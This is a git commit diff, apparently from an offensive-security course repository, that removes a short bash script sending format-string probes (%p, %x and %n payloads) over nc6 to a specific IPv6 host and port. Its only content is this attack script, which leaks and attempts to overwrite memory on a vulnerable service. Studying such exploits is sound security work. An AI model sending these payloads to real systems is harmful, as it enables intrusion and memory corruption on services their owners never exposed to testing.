cf324340d30dbf314b0075127187046edd208338
imdigitaljim <imdigitaljim@gmail.com>
2017-01-26 20:06:53 -0500

    moved some code around

--- Offensive Network Security/Buffer Overflow/attack2.sh
+++
@@ -1,9 +0,0 @@
-#!/bin/bash
-
-perl -e 'print "\n"'|nc6 2601:4c0:4000:e1d8:a00:27ff:fe1c:eb3c 55555
-perl -e 'print "Test Test\n"'|nc6 2601:4c0:4000:e1d8:a00:27ff:fe1c:eb3c 55555
-perl -e 'print "%p%p%p%p\n"'|nc6 2601:4c0:4000:e1d8:a00:27ff:fe1c:eb3c 55555
-perl -e 'print "%x%x%x%x\n"'|nc6 2601:4c0:4000:e1d8:a00:27ff:fe1c:eb3c 55555
-perl -e 'print "%x%x%n%n\n"'|nc6 2601:4c0:4000:e1d8:a00:27ff:fe1c:eb3c 55555
-perl -e 'print "%x%x%n%n\n"'|nc6 2601:4c0:4000:e1d8:a00:27ff:fe1c:eb3c 55555
-perl -e 'print "%x%x%n%n\n"'|nc6 2601:4c0:4000:e1d8:a00:27ff:fe1c:eb3c 55555
